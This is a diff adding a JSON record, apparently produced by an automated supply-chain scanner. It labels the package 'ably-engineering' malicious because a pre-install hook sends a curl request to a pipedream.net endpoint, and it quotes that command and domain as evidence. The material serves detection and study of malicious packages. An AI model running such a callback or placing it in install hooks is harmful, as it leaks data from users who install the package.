@@ -1,0 +1,35 @@
+{
+  "package_name": "ably-engineering",
+  "version": "1.0.0",
+  "label": "malicious",
+  "behaviors": [
+    {
+      "category": "data_exfiltration",
+      "summary": "The package contains a pre-install hook that sends data exfiltration signals to an external URL.",
+      "details": "The pre-install hook contains a curl command that sends a request to an external URL. This could potentially be used to exfiltrate sensitive data.",
+      "confidence": 0.8,
+      "evidence_apis": [],
+      "evidence_files": [],
+      "evidence_domains": [
+        "https://eo7k0ogyrj0trrn.m.pipedream.net"
+      ],
+      "evidence_commands": [
+        "curl https://eo7k0ogyrj0trrn.m.pipedream.net"
+      ],
+      "evidence_env_vars": []
+    }
+  ],
+  "risk_vector": [
+    "data_exfiltration"
+  ],
+  "analyst_note": "",
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "semantic_v2.0",
+    "routing": "flag",
+    "structural_risk_score": 1.0,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-26T21:59:14.451464"
+}
